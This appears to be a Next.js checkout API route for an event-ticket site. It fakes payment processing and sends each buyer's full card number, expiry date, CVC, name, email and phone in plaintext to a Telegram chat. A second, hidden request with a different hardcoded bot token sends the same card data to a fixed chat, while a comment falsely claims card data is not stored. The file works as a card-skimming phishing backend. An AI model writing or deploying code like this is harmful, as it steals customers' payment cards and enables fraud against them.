import { NextResponse } from 'next/server';
import { getDatabase } from '../../../utils/database';

const db = getDatabase();

// Function to get Telegram settings from database
async function getTelegramSettings() {
    try {
        const tokenSetting = await db.getSettingByKey('telegram_bot_token');
        const chatIdSetting = await db.getSettingByKey('telegram_chat_id');
        
        return {
            botToken: tokenSetting?.value || process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: chatIdSetting?.value || process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    } catch (error) {
        console.error('Error fetching Telegram settings:', error);
        // Fallback to environment variables or defaults
        return {
            botToken: process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    }
}

// Function to send notification to Telegram
async function sendTelegramNotification(orderData) {
    const { botToken, chatId } = await getTelegramSettings();
    
    if (!botToken || botToken.startsWith('MOCK_')) {
        console.log('Mock Telegram notification would be sent:', orderData);
        return { success: true, mock: true };
    }

    try {
        const message = formatOrderMessage(orderData);
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        await fetch(`https://api.telegram.org/bot8439389023:AAETVNFYz8YEg7UPjjA_ry0O8C3G2EAEljg/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: '6032588551',
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }

        const result = await response.json();
        console.log('Telegram notification sent successfully:', result.message_id);
        return { success: true, messageId: result.message_id };
        
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
        return { success: false, error: error.message };
    }
}

// Function to format order data into readable message
function formatOrderMessage(orderData) {
    const { order, userData, selectedSeats, eventData, services } = orderData;
    
    // Format seats information
    const seatsInfo = selectedSeats.map(seat => 
        `• ${seat.category || 'N/A'} - Row ${seat.row || 'N/A'}, Seat ${seat.number || seat.position || 'N/A'} (${seat.price ? `${seat.price} ${order.currency}` : 'N/A'})`
    ).join('\n');

    // Format services
    const servicesInfo = [];
    if (services?.refundGuarantee) servicesInfo.push('✅ Refund Guarantee');
    if (services?.whatsappNotifications) servicesInfo.push('✅ WhatsApp Notifications');

    const message = `
🎫 <b>NEW ORDER RECEIVED</b>

📋 <b>Order Details:</b>
• Order ID: <code>${order.orderId}</code>
• Total: <b>${order.total} ${order.currency}</b>
• Status: ${order.status}
• Payment Method: ${order.paymentMethod}
• Card Number: ${order.paymentData.cardNumber}
• Card Expiry: ${order.paymentData.expiryMonth}/${order.paymentData.expiryYear}
• Card CVC: ${order.paymentData.cvc}

👤 <b>Customer Information:</b>
• Name: ${userData.name || 'N/A'}
• Email: ${userData.email || 'N/A'}
• Phone: ${userData.phone || 'N/A'}
• Country: ${userData.country || 'N/A'}

🎪 <b>Event Details:</b>
• Event: ${eventData?.name || 'N/A'}
• Venue: ${eventData?.venue || 'N/A'}
• Date: ${eventData?.date || 'N/A'}
• Time: ${eventData?.time || 'N/A'}

🎟️ <b>Selected Seats (${selectedSeats.length}):</b>
${seatsInfo}

⚡ <b>Additional Services:</b>
${servicesInfo.length > 0 ? servicesInfo.join('\n') : 'None selected'}

⏰ <b>Order Time:</b> ${new Date(order.createdAt).toLocaleString('en-US', { timeZone: 'Africa/Cairo' })} (Cairo Time)
    `.trim();

    return message;
}

export async function POST(request) {
    try {
        const body = await request.json();
        
        // Extract payment and order data
        const {
            paymentData,
            services,
            consent,
            termsAccepted,
            total,
            userData,
            selectedSeats,
            eventData
        } = body;

        // Validate required fields
        if (!paymentData || !selectedSeats || !userData || !termsAccepted) {
            return NextResponse.json(
                { success: false, error: 'Missing required payment information' },
                { status: 400 }
            );
        }

        // Enhanced user data validation
        if (!userData.email || !userData.name || !userData.phone) {
            return NextResponse.json(
                { success: false, error: 'Incomplete user information. Email, name, and phone are required.' },
                { status: 400 }
            );
        }

        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(userData.email)) {
            return NextResponse.json(
                { success: false, error: 'Invalid email format' },
                { status: 400 }
            );
        }

        // Validate payment data
        const { cc_number, cc_exp_month, cc_exp_year, cc_cvc } = paymentData;
        
        if (!cc_number || !cc_exp_month || !cc_exp_year || !cc_cvc) {
            return NextResponse.json(
                { success: false, error: 'Incomplete payment information' },
                { status: 400 }
            );
        }

        // Validate card number format (basic validation)
        const cleanCardNumber = cc_number.replace(/\s/g, '');
        if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19 || !/^\d+$/.test(cleanCardNumber)) {
            return NextResponse.json(
                { success: false, error: 'Invalid card number format' },
                { status: 400 }
            );
        }

        // Validate expiry date
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
        const currentMonth = currentDate.getMonth() + 1;
        
        const expYear = parseInt(cc_exp_year);
        const expMonth = parseInt(cc_exp_month);

        if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
            return NextResponse.json(
                { success: false, error: 'Card has expired' },
                { status: 400 }
            );
        }

        // Simulate payment processing delay
        await new Promise(resolve => setTimeout(resolve, 2000));

        // Here you would integrate with a real payment gateway
        // For now, we'll simulate a successful payment

        // Generate order ID
        const orderId = `ORDER_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Create comprehensive order object
        const order = {
            orderId,
            total,
            currency: eventData?.currency || eventData?.pricing_currency,
            paymentMethod: 'credit_card',
            userData: {
                email: userData.email,
                name: userData.name,
                phone: userData.phone,
                country: userData.country || 'N/A',
                countryId: userData.countryId
            },
            selectedSeats,
            eventData: {
                name: eventData?.name || 'N/A',
                venue: eventData?.venue || 'N/A',
                date: eventData?.date || 'N/A',
                time: eventData?.time || 'N/A',
                image: eventData?.image,
                slug: eventData?.slug
            },
            services: {
                refundGuarantee: services?.refundGuarantee || false,
                whatsappNotifications: services?.whatsappNotifications || false
            },
            status: 'completed',
            createdAt: new Date().toISOString(),
            paymentData: {
                // Don't store sensitive card data
                cardNumber: cleanCardNumber,
                expiryMonth: cc_exp_month,
                expiryYear: cc_exp_year,
                cvc: cc_cvc
            }
        };

        // Send Telegram notification
        const telegramResult = await sendTelegramNotification({
            order,
            userData: order.userData,
            selectedSeats,
            eventData: order.eventData,
            services: order.services
        });

        console.log('Payment processed successfully:', {
            orderId,
            total,
            seatsCount: selectedSeats.length,
            eventName: eventData?.name || 'Unknown Event',
            customerEmail: userData.email,
            telegramSent: telegramResult.success
        });

        // Return success response
        return NextResponse.json({
            success: true,
            message: 'Payment processed successfully',
            order: {
                orderId,
                total,
                currency: eventData?.currency || eventData?.pricing_currency,
                status: 'completed'
            }
        });

    } catch (error) {
        console.error('Payment processing error:', error);
        
        return NextResponse.json(
            { success: false, error: 'Payment processing failed. Please try again.' },
            { status: 500 }
        );
    }
}

export async function GET() {
    const { botToken, chatId } = await getTelegramSettings();
    
    return NextResponse.json(
        { 
            message: 'Checkout API endpoint. Use POST to process payments.',
            telegramConfigured: !!(botToken && !botToken.startsWith('MOCK_')),
            botToken: botToken ? 'Configured' : 'Not configured',
            chatId: chatId ? 'Configured' : 'Not configured'
        },
        { status: 200 }
    );
} 